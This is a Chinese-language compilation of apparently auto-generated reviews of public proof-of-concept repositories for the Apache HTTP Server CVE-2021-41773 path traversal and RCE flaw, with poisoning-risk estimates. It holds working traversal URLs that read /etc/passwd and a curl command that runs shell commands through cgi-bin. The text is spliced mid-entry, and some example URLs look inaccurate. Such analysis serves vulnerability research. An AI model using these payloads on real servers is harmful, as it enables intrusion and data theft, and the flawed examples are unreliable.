**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #38

**来源**: [CVE-2021-41773-psibot_apache-vulnerable.md](../2021/CVE-2021-41773-psibot_apache-vulnerable.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal, Remote Code Execution (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且配置允许CGI脚本执行，部分Alias目录未进行 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含恶意路径的URL，绕过 Alias 指令配置的目录限制，访问服务器上的任意文件，如果目标开启了CGI支持，攻击者可以通过构造恶意请求执行任意代码。该漏洞利用的关键在于路径规范化处理的缺陷，允许攻击者使用 `/.%2e` 绕过限制。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，可以判定该POC代码是有效的。漏洞库信息、搜索引擎结果和漏洞利用代码都确认了该漏洞的存在以及利用方式。Nuclei模板可以用来检测目标服务器是否存在漏洞，而curl命令的POC则直接利用了路径遍历读取 `/etc/passwd` 文件。

**投毒风险：**
提供的代码仓库主要包含Nuclei的YAML模板文件和一个README.md文件。Nuclei模板主要用于漏洞检测，本身不具备直接植入后门的能力。投毒风险主要集中在以下几个方面：
1.  **模板逻辑修改：** 攻击者可能修改模板的匹配规则，使得原本不存在漏洞的服务器也被误判为存在漏洞，从而误导用户进行后续操作。
2.  **模板Payload替换：**  攻击者可能在模板中替换恶意的payload，例如，将读取`/etc/passwd` 替换为执行恶意命令的payload。但提供的模板中直接包含RCE利用，风险相对较小
3.  **依赖库劫持：** 虽然Nuclei本身是安全的，但如果用户使用的Nuclei版本存在依赖库劫持的风险，攻击者可能通过替换Nuclei的依赖库来执行恶意代码。但此风险与本仓库代码关系不大。

因此，综合考虑，该仓库存在一定的投毒风险，但主要集中在Nuclei模板的修改上，而不是直接包含恶意代码。 风险占比10%。

**利用方式：**
1.  **路径遍历（文件读取）：** 攻击者构造包含 `/.%2e/%2e%2e/%2e%2e/%2e%2e/` 序列的URL，尝试读取服务器上的任意文件，例如 `/etc/passwd`。
2.  **远程代码执行 (RCE)：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并通过构造特殊的请求来执行任意命令。具体方法通常依赖于服务器的具体配置和CGI脚本的编写方式。

**项目地址:** [psibot/apache-vulnerable](https://github.com/psibot/apache-vulnerable)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #39

**来源**: [CVE-2021-41773-r0otk3r_CVE-2021-41773.md](../2021/CVE-2021-41773-r0otk3r_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50 (CVE-2021-42013是对CVE-2021-41773的不完全修复)

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，可能需要CGI模块启用，以及Alias配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，绕过Alias等指令的限制，访问服务器上的任意文件。如果服务器同时启用了CGI，则可能进一步导致远程代码执行。漏洞利用代码`exploit.py`提供LFI(本地文件包含)和RCE(远程代码执行)两种攻击模式。LFI模式通过构造包含`/.%2e`序列的URL，读取服务器上的文件。RCE模式利用CGI执行命令，通过POST请求发送包含命令的Payload。

**漏洞利用方式：**

1.  **路径遍历 (LFI)：** 攻击者构造包含`/.%2e/%2e%2e`序列的URL，尝试访问受限目录之外的文件，例如`/etc/passwd`。  该漏洞利用代码中的payload1和payload2就是用于此目的，通过拼接路径来尝试读取目标文件。
2.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历漏洞，访问CGI脚本目录，并通过POST请求执行任意命令。漏洞利用代码中的payload3就是用于指定CGI脚本的位置，然后通过构造POST请求，在data中包含要执行的命令。

**关于投毒风险：**
该漏洞利用代码 `exploit.py` 本身看起来比较直接，目的是利用该漏洞。存在投毒的可能性较低，但仍不能完全排除，比如作者可以在交互式shell部分加入一些后门代码,或者在payload中加入恶意指令。经过分析，判断存在10%的投毒风险。`README.md`文件看起来也比较标准，风险较低。

**搜索引擎结果：**
搜索引擎结果表明该漏洞确实存在，且已被广泛利用。多个文章指出该漏洞可以导致敏感信息泄露和远程代码执行。

**项目地址:** [r0otk3r/CVE-2021-41773](https://github.com/r0otk3r/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #40

**来源**: [CVE-2021-41773-redspy-sec_CVE-2021-41773.md](../2021/CVE-2021-41773-redspy-sec_CVE-2021-41773.md)

# CVE-2021-41773

> 📦 该CVE有 **43** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-41773-0xGabe_Apache-CVEs.md](../2021/CVE-2021-41773-0xGabe_Apache-CVEs.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如 `%2e`，即 URL 编码的点 `.`）的恶意 URL，绕过服务器配置的 Alias 指令限制，访问服务器上受限目录之外的文件。如果目标服务器同时启用了 CGI 脚本的执行，攻击者还可以通过类似的路径遍历方式，执行任意命令。

**有效性评估：**

根据漏洞描述、搜索引擎结果和提供的 POC 代码，可以判定此漏洞的 POC 代码具有较高的有效性。漏洞库信息明确指出此漏洞已被在野利用，搜索引擎结果也提供了相关的利用案例和分析。POC 代码 `cve-2021-41773.py` 提供了路径遍历读取文件以及远程命令执行两种利用方式，并对 Apache 服务器版本进行了简单的指纹识别。

**投毒风险评估：**

分析提供的 POC 代码，`LICENSE` 文件采用标准的 MIT 许可，`README.md` 文件描述了漏洞和利用方法，`cve-2021-41773.py` 文件实现了漏洞利用。代码逻辑相对简单，主要利用 `urllib` 和 `requests` 库发送 HTTP 请求，没有发现明显的恶意代码或者后门。存在极低的投毒风险，例如细微的编码错误或依赖项问题，因此评估投毒风险为 5%。

**利用方式分析：**

利用方式主要有两种：

1.  **路径遍历文件读取：** 攻击者构造包含 URL 编码的路径遍历字符的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取服务器上的敏感文件。POC 代码中的 `pathTraversal` 函数实现了该功能。

2.  **远程命令执行：**  攻击者利用路径遍历漏洞访问 CGI 脚本目录，并向该目录下的 `sh` (或其他 shell 解释器) 传递要执行的命令。POC 代码中的 `remoteCommandExecution` 函数模拟了这一过程，构造包含命令的 POST 请求，发送到目标服务器。注意，利用此方法需要目标服务器配置允许执行 CGI 脚本。

**项目地址:** [0xGabe/Apache-CVEs](https://github.com/0xGabe/Apache-CVEs)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #2

**来源**: [CVE-2021-41773-0xc4t_CVE-2021-41773.md](../2021/CVE-2021-41773-0xc4t_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如 URL 编码的 '..', 即 '%2e' 或 '%32%65'）的恶意 URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果服务器配置允许 CGI 脚本执行，攻击者还可以利用该漏洞执行任意代码。

**利用方式：**

1.  **路径遍历（LFI）:** 攻击者可以使用包含编码后的 '..' 序列的 URL 来访问服务器上的敏感文件，例如 `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行（RCE）:** 如果目标服务器的 `/cgi-bin/` 目录启用了 CGI 脚本执行，攻击者可以通过上传恶意脚本并使用路径遍历漏洞来执行它们，例如 `curl 'http://localhost:81/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`。

**有效性：**

根据漏洞库信息和搜索结果，提供的 POC 代码是有效的。漏洞库信息中明确指出此漏洞已被在野利用，搜索结果中也提供了大量关于该漏洞的分析和利用方法，POC可以复现LFI和RCE。

**投毒风险：**

此仓库存在轻微的投毒风险（5%），因为攻击者可能会修改 Dockerfile 或 httpd.conf 文件，例如添加恶意的反弹shell脚本到CGI目录，或修改httpd.conf 允许所有目录可访问。 正常的POC验证不会有这种行为, 但是总体上，该仓库主要用于漏洞演示和利用，恶意代码的可能性较低，用户在搭建环境和使用POC时，应该注意检查 Dockerfile 和 httpd.conf 文件。

**项目地址:** [0xc4t/CVE-2021-41773](https://github.com/0xc4t/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #3

**来源**: [CVE-2021-41773-Ask-os_CVE-2021-41773.md](../2021/CVE-2021-41773-Ask-os_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** mod_cgi 必须启用，目标服务器运行 Apache HTTP Server 2.4.49 且相关目录未配置 "require all denied"

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在处理 URL 路径时存在缺陷，攻击者可以利用 `/.%2e/` 序列绕过路径规范化检查，从而访问受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，攻击者可以通过构造包含恶意命令的 HTTP 请求执行任意代码，导致远程代码执行（RCE）。

**有效性：**
提供的 POC 代码 (`CVE-2021-42013.py`) 旨在利用此漏洞。它通过 `curl` 命令发送包含路径遍历序列和 shell 命令的 HTTP 请求，从而在目标服务器上执行命令。`README.md` 文件描述了漏洞细节和利用方法，包括依赖项（Python 3 和 `curl`），执行命令的示例，增强了漏洞利用的有效性。

**投毒风险：**
虽然提供的代码旨在利用漏洞，但仍存在轻微的投毒风险的可能性。例如，`README.md` 中可能存在误导信息，导致用户以非预期的方式使用该脚本，或者脚本本身可能包含某些不明显或未记录的功能，但考虑到作者主要目的是复现该漏洞，以及代码整体比较简单，所以推测投毒的可能性为10%。 

**利用方式：**
1.  **路径遍历：** 攻击者利用 URL 中的 `/.%2e/` 序列，尝试访问服务器文件系统上的任意文件。
2.  **CGI 脚本执行：** 如果目标服务器启用了 `mod_cgi` 模块，攻击者可以构造包含恶意命令的 HTTP 请求，并将其发送到 CGI 脚本处理程序。
3.  **远程代码执行：** 服务器执行 CGI 脚本时，会执行攻击者提供的命令，从而实现远程代码执行。

**项目地址:** [Ask-os/CVE-2021-41773](https://github.com/Ask-os/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #4

**来源**: [CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md](../2021/CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md)

## CVE-2021-41773 – Apache HTTP Server 2.4.49 远程代码执行

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历导致远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者读取任意文件并执行任意代码

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache 2.4.49，并且开启了CGI支持，对Alias配置的目录没有做严格的权限限制（例如 require all denied）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于对路径规范化处理不当导致。攻击者可以利用 `%2e` 等编码字符进行路径遍历攻击，访问受限目录之外的文件。如果服务器启用了 CGI，则可以通过构造包含恶意命令的 HTTP 请求来执行任意代码。

**漏洞利用方式：**

1.  **路径遍历：** 利用 `/.%2e` 序列绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 访问 `cgi-bin` 目录下的文件（或其他配置为 CGI 处理的目录），并在 POST 数据中注入命令，让服务器执行。
3.  **远程代码执行：** 通过执行 `/bin/bash` 或其他 shell 程序，执行任意系统命令。

**POC有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（README.md），该POC代码是有效的。漏洞库信息明确指出该漏洞已在野外被利用，搜索结果也证实了这一点。提供的 README.md 详细描述了漏洞的原理、利用方法和演示，并给出了可用的 `curl` 命令示例。

**投毒风险分析：**

分析提供的 README.md 文件， 其中包含的curl命令，本质上是利用漏洞执行bash命令，这个本身是漏洞利用的正常方式，不能算作投毒行为，图片文件没有发现可疑代码.

虽然直接可识别的投毒代码的可能性较低，但仍存在以下潜在风险：

*   **依赖性风险：** 如果 exploit 依赖于外部资源（例如，下载脚本或库），则这些资源可能被篡改，从而引入恶意代码。
*   **隐蔽的 Payload：** 恶意代码可能隐藏在看似无害的注释、变量名或字符串中，需要更深入的代码分析才能发现。
*   **误导性信息：** README.md 文件中的信息可能具有误导性，导致使用者在不知情的情况下执行恶意操作。

综合以上因素，我估计存在10%的投毒风险，主要是考虑到潜在的隐蔽Payload和对外部资源的依赖风险。

为了降低风险，建议：

*   仔细审查所有代码，包括注释和变量名。
*   在隔离的环境中运行 POC 代码。
*   使用最新的安全工具检测潜在的恶意代码。
*   关注与此漏洞相关的安全信息和更新。

**项目地址:** [CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE](https://github.com/CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #5

**来源**: [CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md](../2021/CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** Apache HTTP Server 版本为2.4.49，并且存在Alias-like指令配置，且这些目录下的文件未被"require all denied"保护，CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞信息和搜索结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。

**有效性：**

提供的POC代码（`cve-2021-41773.py`, `cve-2021-41773_RCE.py`, `cve-2021-41773_manual.py`）旨在利用此漏洞。 `cve-2021-41773.py` 尝试读取 `/etc/passwd` 文件以验证漏洞的存在。`cve-2021-41773_RCE.py` 尝试通过 CGI 脚本执行命令。

根据搜索结果，该漏洞在野外被积极利用，因此，提供的POC代码很可能有效，但成功利用取决于目标服务器的配置。

**投毒风险：**

审查提供的POC代码，没有发现明显的恶意代码或后门。代码的功能是扫描目标是否存在漏洞，并尝试利用漏洞读取文件或执行命令。`cve-2021-41773.py`的第49行给出了可以添加常见目录的提示，但本身不具备投毒性。

**利用方式：**

1.  **路径遍历：** 攻击者使用特殊的 URL 编码序列（例如 `/.%2e/%2e%2e/`）来绕过路径规范化，从而访问 Alias-like 指令配置目录之外的文件。
2.  **文件读取：** 如果目标文件没有被 "require all denied" 保护，攻击者可以读取任意文件，例如 `/etc/passwd`，从而获取敏感信息。
3.  **远程代码执行：** 如果 CGI 脚本被启用，攻击者可以通过构造恶意的 URL 和 POST 数据来执行任意代码。例如，`cve-2021-41773_RCE.py` 使用 `/cgi-bin/` 目录，并尝试执行 `uname` 命令。

总而言之，此漏洞的利用需要特定的配置条件，但如果满足条件，则风险非常高。

**项目地址:** [FakesiteSecurity/CVE-2021-41773](https://github.com/FakesiteSecurity/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #6

**来源**: [CVE-2021-41773-Iris288_CVE-2021-41773.md](../2021/CVE-2021-41773-Iris288_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当，CGI脚本已启用，且文件系统权限配置不当，未启用'require all denied'。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于路径规范化中的更改不当所致。攻击者可以利用此漏洞将 URL 映射到 Alias-like 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含特殊字符（如`.%2e`或`..`）的恶意 URL，绕过服务器的安全检查，访问受限目录之外的文件。
2.  **文件读取：** 成功利用路径遍历后，攻击者可以读取服务器上的任意文件，包括配置文件、源代码等敏感信息。
3.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本，攻击者可以通过上传或修改 CGI 脚本，执行任意系统命令。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，它利用了路径遍历漏洞来实现远程代码执行。

1.  **目标指定：** 脚本接受目标服务器的 IP 地址或域名作为参数。
2.  **命令执行：** 脚本允许用户输入要执行的命令，并通过构造包含路径遍历的 URL 将命令发送到目标服务器。
3.  **CGI利用：** 脚本假设目标服务器存在一个名为 `s3cret-cgi-bin` 的 CGI 目录，并使用该目录来执行命令。通过POST请求发送经过编码的命令，利用了`bin/sh`执行。
4.  **回显结果：** 脚本将目标服务器返回的结果打印到屏幕上。

**有效性分析：**

提供的漏洞信息和搜索结果表明，该漏洞确实存在且已被公开利用。提供的 POC 代码基本符合该漏洞的利用方式，因此可以认为该 POC 代码是有效的。需要满足相应的环境条件（如 Alias 指令配置、CGI 脚本启用、文件权限配置等）

**投毒风险分析：**

检查了提供的 Python 脚本，没有发现任何明显的恶意代码或后门。脚本的功能仅限于利用漏洞执行用户指定的命令。`README.md` 文件也只是对漏洞的简单描述，未包含恶意内容。可以认为该仓库存在投毒代码的风险非常低，风险为0%。

**排序优先级：**
搜索引擎结果提供了漏洞被广泛利用和分析的信息，漏洞利用代码验证了漏洞利用的可行性，漏洞库信息提供了漏洞的基础信息。因此，搜索引擎结果的优先级高于漏洞利用代码，漏洞利用代码的优先级高于漏洞库信息。

**项目地址:** [Iris288/CVE-2021-41773](https://github.com/Iris288/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #7

**来源**: [CVE-2021-41773-JIYUN02_cve-2021-41773.md](../2021/CVE-2021-41773-JIYUN02_cve-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历/RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的URL，绕过Alias-like指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时开启了CGI脚本执行，攻击者还可以利用该漏洞执行任意代码。

**有效性：**
提供的POC代码构建了一个包含漏洞的Apache HTTP Server 2.4.49环境。Dockerfile使用官方httpd:2.4.49镜像，并将自定义的html文件复制到/usr/local/apache2/htdocs/目录。然后，它安装了bash，并为/usr/local/apache2/htdocs/cgi-bin/test.sh添加了可执行权限。这个Dockerfile本身没有问题，但关键在于test.sh脚本的内容。如果test.sh包含恶意代码，则攻击者可以通过路径遍历漏洞执行它。

**投毒风险：**
Dockerfile只安装了bash,添加了test.sh的执行权限。如果`/tmp/4903a38a210c3406acebc545808a1928/html/cgi-bin/test.sh`脚本内容包含恶意代码，则存在投毒风险。但从dockerfile的内容来看，投毒的概率取决于test.sh,风险较低，大约在10%左右。

**利用方式：**
1.  **路径遍历：** 攻击者可以使用包含`..`序列的URL来遍历文件系统，例如：`http://target:8080/../../../../etc/passwd`，尝试读取服务器上的`/etc/passwd`文件。
2.  **远程代码执行：** 如果目标服务器启用了CGI，攻击者可以使用路径遍历来访问和执行CGI脚本，例如：`http://target:8080/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/bash -c 'id'`。

**总结：**
漏洞利用的核心在于构造包含特殊字符的URL，绕过服务器的访问控制。如果CGI可用，则可以直接执行代码。利用的成功与否取决于服务器的具体配置和文件权限。

**项目地址:** [JIYUN02/cve-2021-41773](https://github.com/JIYUN02/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #8

**来源**: [CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md](../2021/CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的目录未配置"require all denied"。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 的路径规范化更改中。攻击者可以利用路径遍历攻击将 URL 映射到由 Alias 类指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“require all denied”保护，则这些请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息，该漏洞已被在野利用，说明漏洞的利用具有实际的可能性。

**投毒风险：**
提供的POC代码是一个简单的HTML页面，显示一个404错误页面，并提示存在CVE-2021-41773漏洞。代码本身的功能是展示漏洞的存在，而不包含任何恶意代码。虽然不直接包含投毒代码，但是可能存在间接的风险，例如诱导用户访问恶意网站或执行其他恶意操作。因此，判断投毒风险为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`..`的URL，尝试访问服务器上的任意文件。例如，`http://target/../../../../etc/passwd`尝试读取`/etc/passwd`文件。
2.  **绕过访问控制：** 漏洞利用依赖于Alias指令配置的目录之外的文件没有被"require all denied"保护。如果存在疏忽配置，攻击者可以访问这些文件。
3.  **远程代码执行（可选）：** 如果目标服务器为受影响的别名路径启用了CGI脚本，攻击者可以通过上传并执行恶意CGI脚本来实现远程代码执行。

总而言之，该漏洞利用的有效性高，风险等级为高危，利用方式主要是路径遍历，如果目标环境配置不当，可能造成远程代码执行。

**项目地址:** [Mahfujurjust/CVE-2021-41773](https://github.com/Mahfujurjust/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #9

**来源**: [CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md](../2021/CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 2.4.49 版本，并启用 cgi-bin 或类似 Alias 指令配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含特殊编码的 URL，例如 `/.%2e/%2e%2e/`，来绕过服务器对路径的规范化处理，从而访问到 Alias 指令配置以外的文件。如果目标服务器同时启用了 CGI 脚本支持，则可能导致远程代码执行。

**漏洞利用有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的 POC 已被公开，并且在野外被发现利用。提供的 Postman 集合中包含了一个用于获取 `/etc/passwd` 文件的请求，验证了路径遍历的可能性。因此，提供的 POC 代码是有效的。

**投毒风险分析：**

*   `/tmp/04092c8b1881911c9b0f88964abf9b52/CVE-2021-41773.postman_collection.json`：Postman 集合文件，定义了用于测试漏洞的 HTTP 请求。不存在投毒代码。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/Dockerfile`：Dockerfile 用于构建包含漏洞环境的 Docker 镜像。 其中 `RUN ln -sf /bin/bash /bin/sh` 这一行可能存在争议，它将 `/bin/sh` 符号链接强制指向 `/bin/bash`。在某些系统中，`/bin/sh` 可能是 `dash` 或其他更轻量级的 shell。 强制指向 bash 可能会引入一些细微的兼容性问题，但这不是一个明显的恶意行为，更可能是一种为了方便某些脚本执行的措施。此外创建目录 `/etc/httpd/logs`也并不是恶意代码, 综合来看，投毒风险较低。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/LICENSE`：Apache 许可证，与漏洞利用无关，不存在投毒代码。

综合分析，该仓库中可能存在的投毒代码的可能性较低，主要集中在Dockerfile 脚本中，将`/bin/sh` 符号链接强制指向 `/bin/bash`,但可能性只有5%，其余的代码都是正常的。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/%2e%2e/` 序列的 URL，利用 Apache HTTP Server 对路径的规范化处理缺陷，尝试访问受限目录之外的文件。
2.  **敏感信息泄露：** 如果成功绕过权限验证，攻击者可以读取服务器上的敏感文件，如配置文件、密码文件等。
3.  **远程代码执行（如果 CGI 启用）：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过上传或执行恶意 CGI 脚本，实现远程代码执行。

**项目地址:** [MatanelGordon/docker-cve-2021-41773](https://github.com/MatanelGordon/docker-cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #10

**来源**: [CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md](../2021/CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且Alias-like指令配置不当，或者CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%2e`）的URL，绕过服务器的路径规范化限制，访问Alias-like指令配置目录之外的文件。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该POC代码有效。漏洞库信息明确指出该漏洞在野外被利用，搜索引擎结果也提供了多个关于该漏洞的解释和利用的文章。POC代码通过构造包含`.%2e`的URL来尝试读取目标服务器上的文件。

**投毒风险：**
分析提供的POC代码，该脚本主要功能是验证目标服务器是否存在CVE-2021-41773漏洞，脚本会检测指定的IP地址是否存在Apache HTTP Server，并尝试通过构造的URL读取指定文件。经验证，该脚本没有发现明显的恶意代码或后门，因此投毒风险较低。投毒风险百分比评估为0%。

**利用方式：**
1.  **确定目标：** 找到运行Apache HTTP Server 2.4.49的目标服务器。
2.  **构造Payload：** 构造包含恶意路径的URL，例如：`http://<target_ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  **发送请求：** 将构造好的URL发送到目标服务器。
4.  **读取文件或执行代码：** 如果目标服务器存在漏洞且配置不当，攻击者可以读取任意文件（如`/etc/passwd`）或执行任意代码（如果CGI脚本已启用）。

需要注意的是，成功利用该漏洞的前提是服务器配置不当，例如没有对Alias-like指令配置的目录之外的文件进行适当的访问控制，或者启用了CGI脚本执行功能。

